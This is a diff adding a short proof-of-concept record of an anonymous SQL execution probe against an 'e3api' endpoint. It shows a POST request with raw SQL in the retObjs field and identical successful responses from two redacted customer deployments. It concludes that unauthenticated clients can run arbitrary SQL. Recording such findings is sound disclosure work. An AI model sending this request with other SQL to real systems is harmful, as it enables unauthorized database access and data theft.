@@ -1,0 +1,19 @@
+e1 · anonymous SQL execution probe (hosts redacted)
+=====================================================
+
+Deployment A (productCode 1008) — no cookies, no tokens, no En-Status header:
+
+POST /e3api/api/KHATTACH/ExecByControlName_Two
+data = {"controleName":"mod_ComFunc","method":"GetDataBySql_Two","retObjs":["select 1 as e3probe"]}
+
+HTTP 200
+{"status":"success","message":"","data":"{\"A\":[{\"e3probe\":{\"Int32\":1},\"ROWSTATE\":{\"String\":\"2\"}}]}","code":null,"text":null}
+
+Deployment B (productCode 1008, independent customer deployment) — identical request:
+
+HTTP 200
+{"status":"success","message":"","data":"{\"A\":[{\"e3probe\":{\"Int32\":1},\"ROWSTATE\":{\"String\":\"2\"}}]}","code":null,"text":null}
+
+Interpretation: e3probe = 1 proves retObjs[0] was executed by the backend
+SQL Server and its result set was echoed back to an unauthenticated client.
+The default product signature key was accepted unchanged on both deployments.
